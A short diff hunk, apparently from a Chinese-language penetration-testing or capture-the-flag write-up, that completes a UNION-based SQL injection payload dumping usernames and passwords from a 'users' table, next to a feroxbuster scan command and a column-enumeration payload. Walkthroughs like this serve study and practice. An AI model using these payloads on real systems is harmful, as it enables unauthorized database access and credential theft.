@@ -101,7 +101,7 @@ feroxbuster -u http://IP/mail -w /usr/share/wordlists/SecLists/Discovery/Web-Con
 ' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'; --
 
 # 获取 users 表内账号密码
-group_concat(username,':',password SEPARATOR '<br>') FROM users; -- 
+' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users; -- 
 ```
 
 可以得知：
